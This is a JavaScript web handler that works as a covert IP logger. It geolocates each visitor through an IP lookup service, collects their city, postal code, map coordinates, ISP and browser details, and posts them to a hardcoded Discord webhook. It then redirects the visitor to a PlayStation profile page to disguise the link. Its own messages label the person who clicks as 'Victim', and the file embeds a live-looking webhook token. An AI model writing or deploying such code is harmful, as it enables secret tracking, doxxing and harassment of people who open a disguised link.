import fetch from 'node-fetch';

const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";

async function sendToWebhook(message) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        if (!response.ok) {
            console.error(`Failed to send data to webhook. Status: ${response.status}`);
            const errorText = await response.text();
            console.error("Response text:", errorText);
        } else {
            console.log("Data sent to webhook successfully.");
        }
    } catch (error) {
        console.error("Failed to send data to webhook:", error);
    }
}

async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

function detectDeviceType(userAgent) {
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
        return "Tablet";
    } else {
        return "Desktop";
    }
}

export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);
        if (!ipDetails || ipDetails.status !== 'success') {
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }

        // Debug: Check the hosting value in ipDetails
        console.log("Hosting status:", ipDetails.hosting);

        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';
        
        const deviceType = detectDeviceType(userAgent);
        const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
                              /Safari/.test(userAgent) ? 'WebKit' :
                              /Gecko/.test(userAgent) ? 'Gecko' :
                              /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
        const os = /Windows/.test(userAgent) ? 'Windows' :
                   /Mac/.test(userAgent) ? 'macOS' :
                   /Android/.test(userAgent) ? 'Android' :
                   /Linux/.test(userAgent) ? 'Linux' : 'Unknown';

        const coords = ipDetails.lat && ipDetails.lon
            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
            : "Not available";

        let message;

        if (ipDetails.hosting) {
            message = {
                embeds: [
                    {
                        title: "User Send Link To Victim",
                        color: 0xFF0000, // Red color to indicate alert
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            res.end();
        } 

        if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
            message = {
                embeds: [
                    {
                        title: "User Send Link To Victim",
                        color: 0xFF0000, // Red color to indicate alert
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            res.end();
        }

        message = {
            embeds: [
                {
                    title: "User Opened Link",
                    color: 0x00FFFF,
                    description: "Device info collected from Victim.",
                    fields: [
                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
                        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
                        { name: "Coords", value: coords, inline: true },
                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
                        { name: "Operating System", value: `\`${os}\``, inline: true },
                        { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
                        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
                        { name: "Referer", value: `\`${referer}\``, inline: false },
                        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
                        { name: "Hosting", value: "\`No\`", inline: true }
                    ]
                }
            ]
        };

        await sendToWebhook(message);
        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
        res.end();
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
